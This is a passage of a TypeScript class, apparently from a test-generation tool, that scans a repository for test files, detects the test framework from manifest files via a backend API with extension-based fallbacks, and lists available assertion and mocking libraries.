     * More reliable than shell 'find' command in test environments.
     */
    const scanDirectory = (dir: string): void => {
      try {
        const entries = fs.readdirSync(dir, { withFileTypes: true });

        for (const entry of entries) {
          const fullPath = path.join(dir, entry.name);

          if (entry.isDirectory()) {
            // Skip excluded directories
            if (!excludeDirs.has(entry.name)) {
              scanDirectory(fullPath);
            }
          } else if (entry.isFile()) {
            // Check if file matches any test pattern
            const fileName = entry.name;
            if (testPatterns.some(pattern => pattern.test(fileName))) {
              testFiles.push(path.relative(this.repoPath, fullPath));
            }
          }
        }
      } catch (error) {
        // Directory might not exist or be unreadable, skip it
      }
    };

    scanDirectory(this.repoPath);

    // Remove duplicates and return
    return [...new Set(testFiles)];
  }

  /**
   * Format test suite for backend API
   */
  private formatTestSuite(testContent: any): any {
    // If already in correct format, return as-is
    if (testContent.redTests && Array.isArray(testContent.redTests)) {
      return testContent;
    }

    // If it has a single 'red' test, wrap it in redTests array
    if (testContent.red) {
      return {
        redTests: [testContent.red]
      };
    }

    // If it's a raw test suite object with testName/testCode, wrap it
    if (testContent.testName && testContent.testCode) {
      return {
        redTests: [testContent]
      };
    }

    // Fallback: return as-is and let backend handle it
    return testContent;
  }

  /**
   * Detect programming language from file path
   */
  private detectLanguage(filePath: string): string {
    const ext = path.extname(filePath).toLowerCase();

    const languageMap: Record<string, string> = {
      '.rb': 'ruby',
      '.js': 'javascript',
      '.ts': 'typescript',
      '.py': 'python',
      '.java': 'java',
      '.php': 'php',
      '.ex': 'elixir',
      '.exs': 'elixir'
    };

    return languageMap[ext] || 'javascript'; // Default to JavaScript
  }

  /**
   * Detect test framework via backend API using manifest files (package.json, Gemfile, etc.)
   * Falls back to extension-based detection if backend call fails or returns no result.
   */
  private async detectFrameworkWithBackend(filePath: string): Promise<string> {
    if (!this.testIntegrationClient) {
      logger.debug('No TestIntegrationClient — falling back to extension-based detection');
      return this.detectFrameworkFromFile(filePath);
    }

    try {
      // Read manifest files from the repository
      const packageJsonPath = path.join(this.repoPath, 'package.json');
      const gemfilePath = path.join(this.repoPath, 'Gemfile');
      const requirementsTxtPath = path.join(this.repoPath, 'requirements.txt');
      const composerJsonPath = path.join(this.repoPath, 'composer.json');
      const mixExsPath = path.join(this.repoPath, 'mix.exs');
      const pomXmlPath = path.join(this.repoPath, 'pom.xml');
      const buildGradlePath = path.join(this.repoPath, 'build.gradle');

      let packageJson: { devDependencies?: Record<string, string>; dependencies?: Record<string, string> } | null = null;
      let gemfile: string | null = null;
      let requirementsTxt: string | null = null;
      let composerJson: { 'require-dev'?: Record<string, string>; require?: Record<string, string> } | null = null;
      let mixExs: string | null = null;
      let pomXml: string | null = null;
      let buildGradle: string | null = null;

      if (fs.existsSync(packageJsonPath)) {
        try {
          packageJson = JSON.parse(fs.readFileSync(packageJsonPath, 'utf8'));
          // RFC-101 v3.8.72: Extract available test/assertion libraries from devDependencies
          // This tells the LLM what libraries are actually available (e.g., 'should' vs 'chai')
          this.availableTestLibraries = this.extractTestLibraries(packageJson);
          if (this.availableTestLibraries.length > 0) {
            logger.info(`[RFC-103] Test library detection (javascript): found ${this.availableTestLibraries.length} libraries: ${this.availableTestLibraries.join(', ')}`);
          } else {
            logger.debug(`[RFC-103] Test library detection (javascript): no test libraries found in package.json`);
          }
        } catch (parseErr) {
          logger.warn(`Could not parse package.json: ${parseErr}`);
        }
      }
      if (fs.existsSync(gemfilePath)) {
        gemfile = fs.readFileSync(gemfilePath, 'utf8');
      }
      if (fs.existsSync(requirementsTxtPath)) {
        requirementsTxt = fs.readFileSync(requirementsTxtPath, 'utf8');
      }
      if (fs.existsSync(composerJsonPath)) {
        try {
          composerJson = JSON.parse(fs.readFileSync(composerJsonPath, 'utf8'));
        } catch (parseErr) {
          logger.warn(`Could not parse composer.json: ${parseErr}`);
        }
      }
      if (fs.existsSync(mixExsPath)) {
        mixExs = fs.readFileSync(mixExsPath, 'utf8');
      }
      if (fs.existsSync(pomXmlPath)) {
        pomXml = fs.readFileSync(pomXmlPath, 'utf8');
      }
      if (fs.existsSync(buildGradlePath)) {
        buildGradle = fs.readFileSync(buildGradlePath, 'utf8');
      }

      // Find config files in repo root that indicate frameworks
      const configPatterns = [
        'vitest.config.ts', 'vitest.config.js', 'vitest.config.mts',
        'jest.config.ts', 'jest.config.js', 'jest.config.mjs',
        '.mocharc.yml', '.mocharc.json', '.mocharc.js',
        'pytest.ini', 'setup.cfg', 'pyproject.toml',
        '.rspec', 'spec_helper.rb',
        'phpunit.xml', 'phpunit.xml.dist',
        'mix.exs'
      ];
      const configFiles = configPatterns.filter(f => fs.existsSync(path.join(this.repoPath, f)));

      // Skip backend call if no manifest files found
      if (!packageJson && !gemfile && !requirementsTxt && !composerJson && !mixExs && !pomXml && !buildGradle && configFiles.length === 0) {
        logger.debug('No manifest files found — falling back to extension-based detection');
        return this.detectFrameworkFromFile(filePath);
      }

      const response = await this.testIntegrationClient.detectFramework({
        packageJson,
        gemfile,
        requirementsTxt,
        composerJson,
        mixExs,
        pomXml,
        buildGradle,
        configFiles
      });

      logger.info(`Backend framework detection: ${response.framework} (testDir: ${response.testDir})`);
      return response.framework;
    } catch (error) {
      logger.warn(`Backend framework detection failed, falling back to extension-based: ${error}`);
      return this.detectFrameworkFromFileWithEcosystemFallback(filePath);
    }
  }

  /**
   * RFC-101 v3.8.72: Extract test/assertion libraries from package.json devDependencies.
   * Returns library names that the LLM should know about when generating tests.
   *
   * Common assertion libraries: chai, should, expect, expect.js, assert, power-assert
   * Common test utilities: sinon, testdouble, nock, supertest, enzyme, testing-library
   */
  private extractTestLibraries(packageJson: { devDependencies?: Record<string, string>; dependencies?: Record<string, string> } | null): string[] {
    if (!packageJson) return [];

    const testLibraryPatterns = [
      // Assertion libraries
      'chai', 'should', 'expect', 'expect.js', 'power-assert', 'assert',
      // Test runners (useful context)
      'mocha', 'jest', 'vitest', 'ava', 'tape', 'jasmine',
      // Mocking/stubbing
      'sinon', 'testdouble', 'nock', 'msw',
      // HTTP testing
      'supertest', 'superagent',
      // React testing
      '@testing-library/react', '@testing-library/jest-dom', 'enzyme',
      // General utilities that affect test writing
      'faker', '@faker-js/faker', 'chance'
    ];

    const allDeps = {
      ...packageJson.dependencies,
      ...packageJson.devDependencies
    };

    const found: string[] = [];
    for (const pattern of testLibraryPatterns) {
      if (allDeps[pattern]) {
        found.push(pattern);
      }
    }

    // Always include Node's built-in assert as available
    if (found.length > 0 && !found.includes('assert')) {
      found.push('assert (Node built-in)');
    }

    return found;
  }

  /**
   * Detect framework with ecosystem-aware fallback.
   * If file extension doesn't match the project's primary ecosystem, use the project's test framework.
   * This prevents JS files in Python projects from using vitest, etc.
   */
  private detectFrameworkFromFileWithEcosystemFallback(filePath: string): string {
    const ext = path.extname(filePath).toLowerCase();

    // Map file extensions to their natural ecosystem
    const extToEcosystem: Record<string, string> = {
      '.js': 'javascript', '.ts': 'javascript', '.jsx': 'javascript', '.tsx': 'javascript', '.mjs': 'javascript',
      '.py': 'python',
      '.rb': 'ruby',
      '.php': 'php',
      '.java': 'java',
      '.ex': 'elixir', '.exs': 'elixir',
      '.go': 'go',
    };

    // Map ecosystem to default test framework
    const ecosystemToFramework: Record<string, string> = {
      'javascript': 'vitest',
      'python': 'pytest',
      'ruby': 'rspec',
      'php': 'phpunit',
      'java': 'junit5',
      'elixir': 'exunit',
      'go': 'testing',
    };

    const fileEcosystem = extToEcosystem[ext];

    // If we have project ecosystems and the file's ecosystem doesn't match the project's primary,
    // use the project's primary ecosystem's test framework
    if (this.projectEcosystems.length > 0 && fileEcosystem) {
      const primaryEcosystem = this.projectEcosystems[0]; // First ecosystem is primary

      if (!this.projectEcosystems.includes(fileEcosystem)) {
        // File's ecosystem doesn't match any project ecosystem
        // Use the primary ecosystem's test framework
        const framework = ecosystemToFramework[primaryEcosystem];
        if (framework) {
          logger.info(`[RFC-101] File ${path.basename(filePath)} (${fileEcosystem}) doesn't match project ecosystem (${primaryEcosystem}). Using ${framework}.`);
          return framework;
        }
      }
    }

    // Fall back to extension-based detection
    return this.detectFrameworkFromFile(filePath);
  }

  /**
   * Detect test framework from source file extension
   */
  private detectFrameworkFromFile(filePath: string): string {
    const ext = path.extname(filePath).toLowerCase();

    // Map source file extensions to likely test frameworks
    const frameworkMap: Record<string, string> = {
      '.rb': 'rspec',
      '.js': 'vitest',
      '.ts': 'vitest',
      '.py': 'pytest',
      '.java': 'junit5',
      '.php': 'phpunit',
      '.ex': 'exunit',
      '.exs': 'exunit'
    };

    return frameworkMap[ext] || 'vitest'; // Default to vitest for JS/TS projects
  }
}